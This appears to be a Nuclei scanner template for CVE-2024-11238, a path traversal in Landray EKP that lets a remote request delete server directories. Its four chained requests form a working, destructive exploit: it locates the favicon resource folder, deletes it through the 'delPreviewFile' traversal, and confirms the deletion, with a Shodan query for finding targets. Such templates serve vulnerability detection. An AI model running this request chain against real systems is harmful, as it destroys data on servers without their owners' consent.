flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - group: 1
    internal: true
    name: faviconPath
    part: body
    regex:
    - href="/resource/(.*?)/favicon.ico"
    type: regex
  matchers:
  - dsl:
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /login.jsp HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /resource/{{faviconPath}}/favicon.ico HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - content_length == 0
    internal: true
    type: dsl
  raw:
  - 'GET /sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile&directoryPath=../{{faviconPath}}/
    HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - status_code == 404
    type: dsl
  raw:
  - 'GET /resource/{{faviconPath}}/favicon.ico HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-11238
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:landray:landray_ekp:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-11238
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
    cvss-score: 6.5
    cwe-id: CWE-22
    epss-percentile: 0.93115
    epss-score: 0.10835
  description: 'A vulnerability, which was classified as critical, was found in Landray
    EKP up to 16.0. This affects the function delPreviewFile of the file /sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile.
    The manipulation of the argument directoryPath leads to path traversal. It is
    possible to initiate the attack remotely. The exploit has been disclosed to the
    public and may be used. The vendor was contacted early about this disclosure but
    did not respond in any way.

    '
  impact: 'Remote attackers can access arbitrary files on the server, potentially
    leading to information disclosure or system compromise.

    '
  metadata:
    product: landray_ekp
    shodan-query: http.favicon.hash:831854882
    vendor: landray
    verified: true
  name: Landray EKP - Path Traversal
  reference:
  - https://github.com/CoinIsMoney/TempGuide/blob/main/LL-exp-02.pdf
  - https://nvd.nist.gov/vuln/detail/CVE-2024-11238
  - https://vuldb.com/?ctiid.284673
  remediation: 'Update to the latest version that addresses this vulnerability or
    apply appropriate patches.

    '
  severity: medium
  tags: cve,cve2024,lfi,intrusive,vkev
